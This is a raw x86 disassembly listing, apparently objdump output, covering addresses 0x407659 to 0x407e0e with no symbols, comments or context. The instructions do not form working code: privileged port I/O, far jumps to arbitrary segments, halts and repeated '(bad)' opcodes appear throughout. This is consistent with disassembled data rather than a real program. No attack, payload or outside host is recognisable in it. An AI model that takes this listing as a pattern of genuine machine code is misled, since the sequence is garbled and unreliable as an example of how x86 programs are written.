  407659:	pop    edx
  40765a:	in     al,dx
  40765b:	ins    BYTE PTR es:[edi],dx
  40765c:	neg    DWORD PTR [eax]
  40765e:	neg    bl
  407660:	ins    BYTE PTR es:[edi],dx
  407661:	ins    DWORD PTR es:[edi],dx
  407662:	outs   dx,DWORD PTR ds:[esi]
  407663:	mov    al,0xb5
  407665:	cmp    DWORD PTR [eax+esi*1+0x18],esp
  407669:	mov    dl,0x31
  40766b:	sbb    cl,dl
  40766d:	sbb    ebp,DWORD PTR [eax+edx*4+0x24]
  407671:	sub    eax,0x396ad5a
  407676:	pop    es
  407677:	outs   dx,DWORD PTR ds:[esi]
  407678:	es pop eax
  40767a:	rcr    BYTE PTR [eax],0x1f
  40767d:	mov    dl,0x14
  40767f:	xchg   edx,eax
  407680:	lds    esp,FWORD PTR [ebx+0x1544e8b9]
  407686:	into   
  407687:	cmp    al,0x82
  407689:	and    eax,0x556fb51c
  40768e:	fnstcw WORD PTR [ebx]
  407690:	in     al,dx
  407691:	push   ebx
  407692:	inc    edx
  407693:	or     BYTE PTR ds:0x718071b4,al
  407699:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40769a:	add    DWORD PTR [eax],edx
  40769c:	loopne 0x4076de
  40769e:	bound  eax,QWORD PTR [edx]
  4076a0:	pop    esp
  4076a1:	add    DWORD PTR [esi-0x340d0342],ebp
  4076a7:	outs   dx,DWORD PTR ds:[esi]
  4076a8:	loope  0x4076bc
  4076aa:	mov    dl,0x2e
  4076ac:	or     esp,DWORD PTR [ecx]
  4076ae:	add    DWORD PTR cs:[edi],ebp
  4076b1:	add    edx,edi
  4076b3:	sub    esp,0x589e2789
  4076b9:	(bad)  
  4076ba:	retf   
  4076bb:	mov    eax,0xc0035947
  4076c0:	xor    DWORD PTR [ecx+edx*2],esp
  4076c3:	jmp    0xe3c4:0x3f75a94c
  4076ca:	add    ecx,DWORD PTR [ebx]
  4076cc:	adc    BYTE PTR [edx+0x60],al
  4076cf:	mov    ecx,fs
  4076d1:	retf   0xdbd5
  4076d4:	push   0xd98f73b3
  4076d9:	adc    eax,0x42660771
  4076de:	loopne 0x4076ff
  4076e0:	adc    BYTE PTR [eax],ah
  4076e2:	mov    ch,0xdb
  4076e4:	inc    esi
  4076e5:	loop   0x4076e8
  4076e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076e8:	out    0xc3,eax
  4076ea:	jnp    0x407676
  4076ec:	push   edx
  4076ed:	daa    
  4076ee:	int3   
  4076ef:	mov    ah,0x84
  4076f1:	mov    ecx,0x2adc8bf
  4076f6:	inc    esp
  4076f7:	dec    esi
  4076f8:	mov    ds:0x68c89472,al
  4076fd:	daa    
  4076fe:	sti    
  4076ff:	je     0x40775b
  407701:	jnp    0x4076f7
  407703:	pop    edx
  407704:	pop    es
  407705:	or     al,0x7a
  407707:	xlat   BYTE PTR ds:[ebx]
  407708:	sbb    esi,esi
  40770a:	into   
  40770b:	mov    bl,0xd1
  40770d:	fwait
  40770e:	mov    cl,0xb3
  407710:	sub    eax,ebx
  407712:	fisubr DWORD PTR [ebx+esi*1+0x1a]
  407716:	neg    cl
  407718:	fcomp  QWORD PTR [eax+esi*4]
  40771b:	mov    bl,0xbd
  40771d:	leave  
  40771e:	jo     0x4076c3
  407720:	iret   
  407721:	push   0x3468c1b4
  407726:	inc    eax
  407727:	dec    edx
  407728:	mov    DWORD PTR [edx+0x9],edx
  40772b:	inc    edx
  40772c:	mov    ch,0x91
  40772e:	xor    al,BYTE PTR [ecx+0x48]
  407731:	adc    DWORD PTR [edx-0x73b5bdd7],0xc41815b1
  40773b:	dec    esi
  40773c:	enter  0x4f95,0x75
  407740:	pop    ss
  407741:	adc    BYTE PTR [eax-0x2b],dh
  407744:	div    BYTE PTR [esi+0xc050e4c]
  40774a:	and    DWORD PTR [ecx+0x15c9f6b5],0xe053100
  407754:	sub    DWORD PTR [ebx],0xeafabeaf
  40775a:	jns    0x407798
  40775c:	cmp    al,ah
  40775e:	jl     0x407772
  407760:	scas   eax,DWORD PTR es:[edi]
  407761:	jecxz  0x40773b
  407763:	les    ecx,FWORD PTR [eax+ebp*1]
  407766:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407767:	xchg   esp,eax
  407768:	lds    esp,FWORD PTR [ebx-0x71]
  40776b:	cmp    eax,0xb0668eb6
  407770:	push   es
  407771:	and    BYTE PTR [ebx+0x49],0x91
  407775:	out    0x3f,eax
  407777:	and    eax,0x60ab6885
  40777c:	add    al,BYTE PTR [eax]
  40777e:	or     BYTE PTR [ecx-0x1b3675ae],al
  407784:	nop
  407785:	fstp   TBYTE PTR [ebx-0x70b551e7]
  40778b:	jb     0x40773c
  40778d:	sbb    eax,0x99b28257
  407792:	jmp    0x5:0xb1d2885a
  407799:	inc    edx
  40779a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40779b:	fldenv [ecx-0x6d4b5edc]
  4077a1:	sub    al,0x57
  4077a3:	sbb    al,0xe4
  4077a5:	(bad)  
  4077a6:	(bad)  
  4077a7:	jbe    0x4077de
  4077a9:	mov    BYTE PTR [edx],al
  4077ab:	sub    DWORD PTR [ebx-0x5c],ecx
  4077ae:	sub    BYTE PTR [ecx+0x272a4e62],dl
  4077b4:	and    al,0x6a
  4077b6:	dec    edx
  4077b7:	daa    
  4077b8:	sub    eax,0xfa4bb4e8
  4077bd:	fstp   QWORD PTR [ebx+0x30aef46c]
  4077c3:	sbb    dl,BYTE PTR [esp+ecx*4-0x3ca4dafa]
  4077ca:	mov    WORD PTR [ebp+0x7bf430d],gs
  4077d0:	mov    ebp,0x6830628e
  4077d5:	mov    bl,0x39
  4077d7:	fisub  DWORD PTR [eax+0x1a30183f]
  4077dd:	ins    DWORD PTR es:[edi],dx
  4077de:	mov    cl,0xb1
  4077e0:	mov    cl,0x49
  4077e2:	xchg   edx,eax
  4077e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077e4:	dec    eax
  4077e5:	xchg   ebp,eax
  4077e6:	loopne 0x40781a
  4077e8:	and    DWORD PTR ds:0x343ee7d6,eax
  4077ee:	add    DWORD PTR [edx-0x490e0f57],esp
  4077f4:	clc    
  4077f5:	not    DWORD PTR [ecx+0x0]
  4077f8:	jno    0x40784e
  4077fa:	mov    ecx,0x80f5f623
  4077ff:	push   ds
  407800:	jo     0x40780c
  407802:	clc    
  407803:	jo     0x4077a8
  407805:	dec    eax
  407806:	mov    DWORD PTR [ebx],eax
  407808:	mov    BYTE PTR [ecx],bl
  40780a:	mov    al,0x67
  40780c:	lods   eax,DWORD PTR ds:[esi]
  40780d:	mov    ebp,0x6f1bc6f5
  407812:	mov    WORD PTR [ebp-0x77bd78f0],es
  407818:	fild   DWORD PTR [edx-0x78]
  40781b:	jge    0x4077b9
  40781d:	lahf   
  40781e:	loop   0x40784d
  407820:	sub    ebp,esp
  407822:	fwait
  407823:	sar    BYTE PTR [ecx-0x41],0x7d
  407827:	jb     0x407817
  407829:	fdivr  QWORD PTR [ecx]
  40782b:	ret    
  40782c:	lahf   
  40782d:	arpl   WORD PTR [ecx+0x3],bx
  407830:	shl    BYTE PTR [ecx],0x44
  407833:	sar    BYTE PTR [ebx-0x5c],0x94
  407837:	dec    eax
  407838:	lahf   
  407839:	(bad)  
  40783a:	sbb    edi,ebx
  40783c:	add    BYTE PTR [esi],cl
  40783e:	cmpxchg8b QWORD PTR [esi+eiz*2+0x12]
  407843:	lods   al,BYTE PTR ds:[esi]
  407844:	jp     0x40785d
  407846:	repz sub ecx,DWORD PTR ds:0xc7040958
  40784d:	popf   
  40784e:	aaa    
  40784f:	xor    edx,DWORD PTR [eax]
  407851:	and    BYTE PTR [edi+ebx*8-0x1ab63412],dh
  407858:	mov    bh,0x3b
  40785a:	aas    
  40785b:	test   BYTE PTR [ecx+0x3722ac0a],dh
  407861:	adc    dh,BYTE PTR [esp+eiz*2+0x2870133f]
  407868:	rcr    BYTE PTR [edx],0xef
  40786b:	or     BYTE PTR [esp+ecx*2+0x42],dh
  40786f:	leave  
  407870:	sub    DWORD PTR [ecx-0x395c5bc6],ecx
  407876:	je     0x4078d2
  407878:	sti    
  407879:	mov    WORD PTR [edx-0x49],?
  40787c:	fcomp  st(2)
  40787e:	mov    eax,0x12e0d6c9
  407883:	fwait
  407884:	sbb    ebx,DWORD PTR [edx+0x27042733]
  40788a:	dec    edi
  40788b:	je     0x4078a6
  40788d:	outs   dx,BYTE PTR ds:[esi]
  40788e:	je     0x407869
  407890:	ficomp WORD PTR [edx]
  407892:	xor    bl,BYTE PTR [esi+esi*8]
  407895:	jmp    0x64d3410
  40789a:	add    edi,edx
  40789c:	std    
  40789d:	and    DWORD PTR [edx+0x25],edx
  4078a0:	dec    eax
  4078a1:	test   eax,0x21049248
  4078a6:	pop    esp
  4078a7:	fiadd  WORD PTR [ebx+0x45130631]
  4078ad:	sub    ebp,esi
  4078af:	(bad)  
  4078b0:	and    bl,BYTE PTR [edx-0x3bfea91b]
  4078b6:	xor    DWORD PTR [ebp-0x6d],ecx
  4078b9:	inc    esp
  4078ba:	or     BYTE PTR [ecx],dh
  4078bc:	les    esi,FWORD PTR [ecx]
  4078be:	mov    bl,dl
  4078c0:	inc    edi
  4078c1:	pop    ebp
  4078c2:	mov    edi,0x9cb8e1
  4078c7:	scas   eax,DWORD PTR es:[edi]
  4078c8:	pop    esp
  4078c9:	mov    ecx,0x9c2de572
  4078ce:	jecxz  0x4078c2
  4078d0:	stos   BYTE PTR es:[edi],al
  4078d1:	adc    dl,ah
  4078d3:	sti    
  4078d4:	ficomp WORD PTR [edi]
  4078d6:	jno    0x407931
  4078d8:	or     BYTE PTR [ecx-0x361b0d81],dh
  4078de:	pop    ds
  4078df:	sti    
  4078e0:	mov    al,0xe7
  4078e2:	sbb    al,BYTE PTR [eax]
  4078e4:	mov    fs,WORD PTR [ecx]
  4078e6:	push   edx
  4078e7:	test   eax,0xe5a7c107
  4078ec:	add    cl,BYTE PTR [eax]
  4078ee:	add    DWORD PTR ds:0x49800054,0xdf95eb89
  4078f8:	imul   esp,DWORD PTR [edi-0xe7be7ef],0xe7bb7be7
  407902:	or     dl,0xbc
  407905:	or     bl,bl
  407907:	test   al,dh
  407909:	or     al,0xc2
  40790b:	sti    
  40790c:	pop    ds
  40790d:	lods   al,BYTE PTR ds:[esi]
  40790e:	add    cl,dl
  407910:	add    dl,cl
  407912:	add    DWORD PTR [edx+ebx*1],esp
  407915:	add    DWORD PTR [esi],0x9fd92d32
  40791b:	or     DWORD PTR [esi-0x4729791b],ebp
  407921:	mov    al,ds:0xe8d9ced7
  407926:	pop    ss
  407927:	in     al,dx
  407928:	fcomp  QWORD PTR [edx-0x378f45cf]
  40792e:	inc    esi
  40792f:	ja     0x407973
  407931:	mov    edi,0x3bc0c073
  407936:	sub    al,0x3b
  407938:	jmp    0x8d1d7f62
  40793d:	lea    eax,[ecx+0x184ddfa0]
  407943:	push   cs
  407944:	sti    
  407945:	or     al,0x7a
  407947:	sbb    eax,0x830ebd7a
  40794c:	inc    BYTE PTR [eax+0x2108e18d]
  407952:	adc    eax,0x5448492a
  407957:	adc    BYTE PTR [eax-0x4a581e36],0x18
  40795e:	mov    ebx,0x58a3e050
  407963:	inc    esp
  407964:	in     eax,dx
  407965:	leave  
  407966:	mov    ?,WORD PTR [eax]
  407968:	sbb    eax,0xc4626b8e
  40796d:	adc    ch,BYTE PTR [esi+0x42918c6d]
  407973:	mov    BYTE PTR [esi],bh
  407975:	rol    bh,1
  407977:	mov    cl,0x89
  407979:	lahf   
  40797a:	imul   ebx,DWORD PTR [ebx+esi*1-0x3f9bbde9],0xde6f375b
  407985:	jl     0x407992
  407987:	bound  ebx,QWORD PTR [si+0x5297]
  40798c:	mov    esi,0x8021c1ee
  407991:	lds    edi,FWORD PTR [eax+edi*1+0x1c]
  407995:	dec    al
  407997:	fwait
  407998:	sbb    DWORD PTR [ebx+0x0],ebp
  40799b:	mov    eax,0xcfddf947
  4079a0:	jge    0x4079f0
  4079a2:	sbb    BYTE PTR [ebx-0x22],ah
  4079a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079a7:	je     0x4079f2
  4079a9:	inc    eax
  4079aa:	fisub  WORD PTR [ebx+0x521012e]
  4079b0:	jnp    0x407a2d
  4079b2:	pop    es
  4079b3:	mov    WORD PTR [edi],cs
  4079b5:	adc    ebp,esi
  4079b7:	lods   eax,DWORD PTR ds:[esi]
  4079b8:	outs   dx,DWORD PTR ds:[esi]
  4079b9:	cmp    eax,DWORD PTR [edx-0x54]
  4079bc:	out    dx,eax
  4079bd:	rol    ebx,0xff
  4079c0:	ja     0x407a1f
  4079c2:	mov    WORD PTR [edi],es
  4079c4:	add    ecx,DWORD PTR ds:0xcace748
  4079ca:	pop    ss
  4079cb:	push   ss
  4079cc:	add    ah,BYTE PTR [ecx]
  4079ce:	inc    ecx
  4079cf:	leave  
  4079d0:	xchg   esp,eax
  4079d1:	push   esi
  4079d2:	mov    ebx,0xd11dd245
  4079d7:	out    dx,al
  4079d8:	or     edi,DWORD PTR [edx]
  4079da:	and    eax,DWORD PTR [ebp-0x45]
  4079dd:	shrd   DWORD PTR [esi],ebx,cl
  4079e0:	test   al,0xb6
  4079e2:	and    eax,0x25052597
  4079e7:	sti    
  4079e8:	mov    edx,0x8278c6e0
  4079ed:	sbb    al,0x8f
  4079ef:	ror    esp,0x10
  4079f2:	jbe    0x407a40
  4079f4:	dec    ebx
  4079f5:	mov    cs,WORD PTR [ecx+0x55]
  4079f8:	dec    esi
  4079f9:	cmp    edi,DWORD PTR [ecx-0x728a44b3]
  4079ff:	jle    0x407a18
  407a01:	cli    
  407a02:	mov    ebp,0x8751cd84
  407a07:	inc    ecx
  407a08:	pop    edi
  407a09:	ror    DWORD PTR [esi+0x2d],1
  407a0c:	lods   eax,DWORD PTR ds:[esi]
  407a0d:	xchg   esi,eax
  407a0e:	mov    ds:0xd2b452dd,al
  407a13:	test   BYTE PTR [ecx*2+0x6d33985c],ah
  407a1a:	cmp    DWORD PTR [esi],edx
  407a1c:	mov    eax,ds:0x569a5412
  407a21:	dec    esp
  407a22:	mov    ds:0x9b5459f9,al
  407a27:	push   ebx
  407a28:	out    dx,al
  407a29:	cwde   
  407a2a:	sbb    DWORD PTR [edi+esi*8],esi
  407a2d:	xor    eax,0xb1df87bf
  407a32:	xor    al,0x81
  407a34:	and    al,0xde
  407a36:	push   ds
  407a37:	or     DWORD PTR [ebx-0x35],0x3e02db5a
  407a3e:	or     BYTE PTR [eax+esi*1+0x6],bh
  407a42:	sub    eax,0xb1c58421
  407a47:	xchg   DWORD PTR [ebx-0x40],ebx
  407a4a:	lds    eax,FWORD PTR [ebx+0x528b8383]
  407a50:	retf   0xc00b
  407a53:	adc    eax,0x1c6e6f
  407a58:	mov    ebx,0x9038e4de
  407a5d:	push   edx
  407a5e:	out    dx,al
  407a5f:	jecxz  0x407a23
  407a61:	sahf   
  407a62:	pop    ecx
  407a63:	stos   DWORD PTR es:[edi],eax
  407a64:	aad    0xfa
  407a66:	mov    eax,ds:0xd72e38
  407a6b:	jo     0x4079fc
  407a6d:	push   edx
  407a6e:	push   0xffffffdd
  407a70:	dec    ecx
  407a71:	xchg   esp,eax
  407a72:	jp     0x407a3e
  407a74:	pop    edx
  407a75:	mov    ecx,DWORD PTR [edx+0x12]
  407a78:	dec    esp
  407a79:	pop    ecx
  407a7a:	mov    edx,0xd14d3fde
  407a7f:	pop    edx
  407a80:	jae    0x407a77
  407a82:	fisubr DWORD PTR ds:0x97d0d966
  407a88:	mov    esi,0xcaf01817
  407a8d:	lods   ax,WORD PTR ds:[esi]
  407a8f:	push   edi
  407a90:	mov    esp,0xd754901f
  407a95:	mov    eax,DWORD PTR [esi+0x1d]
  407a98:	lods   al,BYTE PTR ds:[esi]
  407a99:	add    al,0x1c
  407a9b:	aaa    
  407a9c:	ds inc ecx
  407a9e:	dec    ecx
  407a9f:	inc    ebx
  407aa0:	call   0x86d6:0xcd6dba08
  407aa7:	loop   0x407a2a
  407aa9:	xchg   ebx,eax
  407aaa:	xchg   esi,eax
  407aab:	adc    ebx,DWORD PTR [ebx-0x7e]
  407aae:	int    0x21
  407ab0:	ins    BYTE PTR es:[edi],dx
  407ab1:	ins    BYTE PTR es:[edi],dx
  407ab2:	or     dl,dl
  407ab4:	and    al,0xc5
  407ab6:	xchg   edx,eax
  407ab7:	mov    ds:0x1ca29775,al
  407abc:	push   edx
  407abd:	call   0xf25b0f75
  407ac2:	adc    cl,BYTE PTR [edx-0x4cf2f5ee]
  407ac8:	adc    cl,dl
  407aca:	mov    ds:0x9415ecc4,al
  407acf:	aaa    
  407ad0:	dec    ebx
  407ad1:	dec    esp
  407ad2:	cdq    
  407ad3:	and    ebp,ebp
  407ad5:	cwde   
  407ad6:	push   esp
  407ad7:	into   
  407ad8:	dec    eax
  407ad9:	aad    0x9c
  407adb:	outs   dx,BYTE PTR ds:[esi]
  407adc:	mov    edx,0x27dd374f
  407ae1:	xchg   ebp,eax
  407ae2:	jae    0x407b1e
  407ae4:	jmp    0x6772d17d
  407ae9:	rcl    BYTE PTR [ebx+0x6c],1
  407aec:	or     al,0x5a
  407aee:	or     al,0xfa
  407af0:	pop    ebp
  407af1:	jp     0x407ad0
  407af3:	cs in  eax,dx
  407af5:	dec    esi
  407af6:	fwait
  407af7:	shl    DWORD PTR [eax+0x48],0x7f
  407afb:	xor    BYTE PTR [eax],ah
  407afd:	dec    ecx
  407afe:	sbb    al,0x28
  407b00:	and    al,0x49
  407b02:	adc    BYTE PTR [edx+0x9],0xd6
  407b06:	sbb    dh,BYTE PTR [esi+esi*1-0x47fa4db9]
  407b0d:	jae    0x407ab3
  407b0f:	and    bh,ah
  407b11:	setns  BYTE PTR [eax-0x876dfb3]
  407b18:	sbb    eax,0x2e308be5
  407b1d:	in     eax,0x5b
  407b1f:	dec    eax
  407b20:	sub    DWORD PTR [ebx-0x4f5e1dd1],eax
  407b26:	pop    ebp
  407b27:	cli    
  407b28:	adc    al,0xf0
  407b2a:	call   0xe148d60b
  407b2f:	jecxz  0x407aef
  407b31:	dec    esp
  407b32:	or     ebx,0x115c5145
  407b38:	inc    edx
  407b39:	mov    esp,0x97146384
  407b3e:	jl     0x407af6
  407b40:	in     eax,0xcb
  407b42:	pop    ss
  407b43:	cs pop esp
  407b45:	cmp    BYTE PTR [eax-0x1c],bh
  407b48:	xchg   ecx,eax
  407b49:	inc    edi
  407b4a:	fidiv  WORD PTR [ebp+0x6b9ed1]
  407b50:	mov    eax,0xdbb56947
  407b55:	daa    
  407b56:	xor    BYTE PTR [esi+0x47],ah
  407b59:	js     0x407b02
  407b5b:	lahf   
  407b5c:	cmc    
  407b5d:	jns    0x407b5b
  407b5f:	and    edi,esp
  407b61:	jmp    esi
  407b63:	int    0x5d
  407b65:	(bad)
  407b6b:	sbb    bh,BYTE PTR gs:[edi-0x59]
  407b6f:	fdivr  QWORD PTR [ebx+0x6b8d29fb]
  407b75:	push   esp
  407b76:	retf   0x36fd
  407b79:	scas   eax,DWORD PTR es:[edi]
  407b7a:	out    dx,eax
  407b7b:	xchg   BYTE PTR [eax],dl
  407b7d:	nop
  407b7e:	sub    BYTE PTR [ecx-0x59],al
  407b81:	add    eax,ebx
  407b83:	or     eax,0x9f74d9d8
  407b88:	lods   eax,DWORD PTR ds:[esi]
  407b89:	adc    DWORD PTR [esp+ebx*4+0x6b0c301f],esi
  407b90:	mov    al,ds:0x42cda034
  407b95:	stc    
  407b96:	mov    ch,0x71
  407b98:	push   ebx
  407b9a:	xor    ah,BYTE PTR [ecx+0x40da09d0]
  407ba0:	pop    esi
  407ba1:	inc    eax
  407ba2:	pop    esi
  407ba3:	out    dx,al
  407ba4:	mov    eax,0x141c0532
  407ba9:	mov    al,0x67
  407bab:	dec    edx
  407bac:	dec    esp
  407bad:	test   eax,0x8a19f391
  407bb2:	or     DWORD PTR [edx+0x77],ebp
  407bb5:	and    dl,0x90
  407bb8:	xchg   esi,eax
  407bb9:	mov    eax,0xd21d4745
  407bbe:	dec    esi
  407bbf:	daa    
  407bc0:	hlt    
  407bc1:	pop    edx
  407bc2:	xchg   edi,eax
  407bc3:	jmp    0x8f1db56c
  407bc8:	mov    al,ds:0xe194bdf
  407bcd:	cli    
  407bce:	je     0x407b8a
  407bd0:	ins    DWORD PTR es:[edi],dx
  407bd1:	cmp    ch,ch
  407bd3:	push   cs
  407bd4:	sbb    eax,ebx
  407bd6:	and    ebp,ebx
  407bd8:	outs   dx,BYTE PTR ds:[esi]
  407bd9:	lahf   
  407bda:	push   esi
  407bdb:	retf   
  407bdc:	mov    cl,0x7
  407bde:	xchg   ebp,eax
  407bdf:	and    al,0x28
  407be1:	jmp    0x3786ade2
  407be6:	push   es
  407be7:	push   0xc2b5b5c5
  407bec:	scas   eax,DWORD PTR es:[edi]
  407bed:	mov    al,0x54
  407bef:	add    eax,0x32777d8d
  407bf4:	cmp    DWORD PTR [esi-0x63],edx
  407bf7:	ret    
  407bf8:	inc    esp
  407bf9:	add    edi,DWORD PTR [ecx-0x529a8684]
  407bff:	push   ebp
  407c00:	(bad)  
  407c01:	cwde   
  407c02:	mov    dh,0x94
  407c04:	jb     0x407c66
  407c06:	lods   eax,DWORD PTR ds:[esi]
  407c07:	cmp    eax,0xf014fc05
  407c0c:	mov    esp,ecx
  407c0e:	pop    edx
  407c0f:	inc    edx
  407c10:	or     BYTE PTR [ebx],al
  407c12:	dec    esp
  407c13:	(bad)  
  407c14:	jecxz  0x407c07
  407c16:	in     eax,0xaf
  407c18:	jge    0x407c07
  407c1a:	imul   edi,DWORD PTR [edi-0x14a9521],0xffffffd9
  407c21:	ror    DWORD PTR [edi+0x3f],cl
  407c24:	jge    0x407c07
  407c26:	js     0x407c57
  407c28:	out    dx,eax
  407c29:	out    dx,al
  407c2a:	mov    dl,0x6
  407c2c:	cmp    BYTE PTR [ebx+0x14],0xa3
  407c30:	cmc    
  407c31:	jnp    0x407bd7
  407c33:	adc    ch,ch
  407c35:	and    al,0x49
  407c37:	nop
  407c38:	push   edx
  407c39:	and    ah,BYTE PTR [ebp-0x6d74a4bc]
  407c3f:	adc    ch,BYTE PTR [esi+eiz*8+0x4a038dfa]
  407c46:	jge    0x407be2
  407c48:	stos   BYTE PTR es:[edi],al
  407c49:	imul   DWORD PTR [edi-0xa]
  407c4c:	stos   BYTE PTR es:[edi],al
  407c4d:	out    dx,eax
  407c4e:	lods   eax,DWORD PTR ss:[esi]
  407c50:	mov    bh,0x81
  407c52:	into   
  407c53:	(bad)  
  407c54:	xlat   BYTE PTR ds:[ebx]
  407c55:	mov    edi,0xd254177f
  407c5a:	sub    DWORD PTR [ebx-0x41],edi
  407c5d:	add    eax,ebx
  407c5f:	add    DWORD PTR [ebp+ecx*1+0x61],ebp
  407c63:	addr16 add al,0xed
  407c66:	ss sub ch,ah
  407c69:	cs addr16 xor al,0x68
  407c6d:	or     eax,esi
  407c6f:	cmp    al,BYTE PTR [eax]
  407c71:	rcr    BYTE PTR [esi],1
  407c73:	or     al,0xb4
  407c75:	jbe    0x407c97
  407c77:	push   eax
  407c78:	cli    
  407c79:	std    
  407c7a:	add    DWORD PTR [edx+ecx*2],ebx
  407c7d:	sbb    eax,0x4eb401c0
  407c82:	sub    BYTE PTR [edx+eax*2+0x56],cl
  407c86:	mov    ah,0x29
  407c88:	cmc    
  407c89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c8a:	fistp  DWORD PTR [edi-0x3e]
  407c8d:	popa   
  407c8e:	or     DWORD PTR [ebx-0x5d],esp
  407c91:	mov    cl,0xba
  407c93:	test   cl,ch
  407c95:	pushf  
  407c96:	xchg   esp,eax
  407c97:	inc    ebx
  407c98:	aam    0xc1
  407c9a:	add    al,0xc5
  407c9c:	xchg   esp,eax
  407c9d:	mov    dh,0xb8
  407c9f:	inc    ebp
  407ca0:	dec    ebx
  407ca1:	sbb    al,0xd2
  407ca3:	dec    esi
  407ca4:	imul   cl
  407ca6:	mov    ch,0xae
  407ca8:	ror    DWORD PTR [edx+0x32],cl
  407cab:	fisubr DWORD PTR [ecx]
  407cad:	or     al,0x7a
  407caf:	ins    DWORD PTR es:[edi],dx
  407cb0:	xchg   BYTE PTR [ebx],bl
  407cb2:	cmp    eax,0x6e949d3a
  407cb7:	mov    bh,0xcd
  407cb9:	jo     0x407d1e
  407cbb:	inc    eax
  407cbc:	mov    bh,0xdb
  407cbe:	mov    ds:0xb4b8eedd,eax
  407cc3:	push   0x22421121
  407cc8:	test   esp,esi
  407cca:	mov    bl,0x39
  407ccc:	leave  
  407ccd:	stos   BYTE PTR es:[edi],al
  407cce:	xchg   edi,eax
  407ccf:	or     al,BYTE PTR ds:[edx+eiz*2]
  407cd3:	gs (bad) 
  407cd6:	frstor [edx+eax*1+0x61]
  407cda:	pop    edi
  407cdb:	sbb    BYTE PTR [edx+0x4efe3cdd],bh
  407ce1:	mov    esi,0x23001589
  407ce6:	mov    ch,0xd6
  407ce8:	sbb    esp,edi
  407cea:	iret   
  407ceb:	lahf   
  407cec:	jg     0x407d60
  407cee:	ja     0x407d67
  407cf0:	test   ecx,0xea7a9ea7
  407cf6:	addr16 mov edi,0xfc6f8df1
  407cfc:	(bad)  
  407cfd:	dec    edi
  407cfe:	aas    
  407cff:	std    
  407d00:	hlt    
  407d01:	or     esi,edi
  407d03:	jmp    0xab7f9d
  407d08:	mov    eax,0x7f5a3167
  407d0d:	inc    eax
  407d0e:	dec    eax
  407d0f:	sub    DWORD PTR [ebp+0x4a55a94f],esp
  407d15:	mov    ecx,0xfb14ad97
  407d1a:	sti    
  407d1b:	mov    bh,0xb9
  407d1d:	mov    ebp,0x8ecac927
  407d22:	add    BYTE PTR [bp+di],ch
  407d25:	pop    es
  407d26:	aad    0xdc
  407d28:	scas   eax,DWORD PTR es:[edi]
  407d29:	cmp    esp,DWORD PTR [ecx-0x3f]
  407d2c:	sub    al,ah
  407d2e:	frstor [ebx+0x15]
  407d31:	push   es
  407d32:	mov    ebx,DWORD PTR [ebx]
  407d34:	mov    cl,0x18
  407d36:	push   es
  407d37:	sub    ecx,DWORD PTR [ebx+0x1]
  407d3a:	imul   ecx,DWORD PTR [edx],0xfa0c36dd
  407d40:	xor    BYTE PTR [edx],bl
  407d42:	cmp    al,BYTE PTR [eax+0x50]
  407d45:	push   0xffffff91
  407d47:	sbb    BYTE PTR [ecx-0x44],ch
  407d4a:	inc    ebp
  407d4b:	popa   
  407d4c:	or     al,0x94
  407d4e:	(bad)  
  407d4f:	jnp    0x407d51
  407d51:	add    ah,BYTE PTR [ebx-0x24]
  407d54:	(bad)  
  407d55:	shr    BYTE PTR [ebx],cl
  407d57:	mov    edi,0x94318e31
  407d5c:	jp     0x407d1f
  407d5e:	push   ds
  407d5f:	ret    0xd2be
  407d62:	add    BYTE PTR cs:[edx+0x28d28a34],ah
  407d69:	repnz mov ds:0x5547a14d,al
  407d6f:	cdq    
  407d70:	mov    ds:0xe58d284,al
  407d75:	(bad)  
  407d76:	out    0xa6,al
  407d78:	sub    DWORD PTR [eax],edx
  407d7a:	xchg   BYTE PTR gs:[eax],ch
  407d7d:	xor    cl,ah
  407d7f:	cmp    BYTE PTR [ebx+0x5c],al
  407d82:	popf   
  407d83:	and    cl,BYTE PTR [esi+eax*2+0x22]
  407d87:	or     bh,BYTE PTR [edx-0x17]
  407d8a:	pushf  
  407d8b:	outs   dx,BYTE PTR ds:[esi]
  407d8c:	jp     0x407d11
  407d8e:	jbe    0x407de2
  407d90:	shr    BYTE PTR [ebx+0x69],cl
  407d93:	cli    
  407d94:	popf   
  407d95:	xchg   edx,eax
  407d96:	pop    esi
  407d97:	retf   
  407d98:	ror    BYTE PTR [edx+0x5],1
  407d9b:	in     eax,dx
  407d9c:	xchg   esi,eax
  407d9d:	and    cl,BYTE PTR [ebp+0x14]
  407da0:	dec    edx
  407da1:	sub    DWORD PTR [edx],edi
  407da3:	popf   
  407da4:	cs mov ebp,0xaf5e80fe
  407daa:	dec    edi
  407dab:	stos   DWORD PTR es:[edi],eax
  407dac:	fnsave [esi+0x26]
  407daf:	xchg   BYTE PTR [edi+0x13],ah
  407db2:	mov    cl,0x92
  407db4:	push   ds
  407db5:	gs push esi
  407db7:	test   ch,ch
  407db9:	ficomp WORD PTR [eax+ebp*4]
  407dbc:	or     eax,0x43826aae
  407dc1:	clc    
  407dc2:	push   ds
  407dc3:	pop    ds
  407dc4:	fild   WORD PTR [edx+eax*4]
  407dc7:	cmp    al,0xcf
  407dc9:	(bad)  
  407dcb:	fucom  st(5)
  407dcd:	imul   ch
  407dcf:	fistp  DWORD PTR [esp+edi*4+0x78]
  407dd3:	icebp  
  407dd4:	ret    
  407dd5:	(bad)  
  407dd7:	cld    
  407dd8:	lock out 0x9e,eax
  407ddb:	jnp    0x407dcb
  407ddd:	mov    ecx,0xc7d8fe5f
  407de2:	imul   BYTE PTR ds:[ebp-0x28690a05]
  407de9:	add    BYTE PTR [eax-0x71],dh
  407dec:	mov    ds:0x8c31e492,al
  407df1:	jno    0x407e30
  407df3:	ds out dx,al
  407df5:	test   DWORD PTR [edx],ebp
  407df7:	sub    DWORD PTR [ecx+0x52],edx
  407dfa:	jb     0x407e2c
  407dfc:	fsubrp st(7),st
  407dfe:	neg    BYTE PTR [esi-0x21790640]
  407e04:	mov    DWORD PTR [esp+ebp*2],esi
  407e07:	jae    0x407e71
  407e09:	hlt    
  407e0a:	in     al,0xf7
  407e0c:	leave  
  407e0d:	push   edi
  407e0e:	adc    ah,bh
